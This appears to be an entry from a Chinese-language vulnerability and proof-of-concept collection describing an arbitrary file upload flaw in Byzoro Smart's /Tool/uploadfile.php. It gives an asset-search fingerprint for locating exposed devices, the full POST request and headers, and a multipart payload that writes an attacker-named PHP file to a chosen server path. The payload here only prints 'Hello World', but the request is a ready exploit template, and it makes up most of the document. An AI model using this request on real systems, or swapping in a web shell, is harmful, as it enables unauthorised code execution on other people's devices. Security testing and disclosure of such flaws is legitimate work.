# 百卓Smartuploadfile存在任意文件上传漏洞

- **系统**：百卓　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app="byzoro-Smart"`
- **请求**：`POST /Tool/uploadfile.php? HTTP/1.1`
- **关键头**：`Cookie: PHPSESSID=942c6029711a902ca974ac33efcdb383`　`Content-Type: multipart/form-data; boundary=---------------------------139…`　`Content-Length: 409`　`Sec-Fetch-User: ?1`

**请求体 / payload**
```
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="file_upload"; filename="contents.php"
Content-Type: application/octet-stream
<?php echo '<p>Hello World</p>'; ?>
-----------------------------13979701222747646634037182887
Content-Disposition: form-data; name="txt_path"
/home/helloworld.php
-----------------------------13979701222747646634037182887--

上传文件位置
/home/helloworld.php
```

**其他**
- 百卓Smart uploadfile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 百卓Smart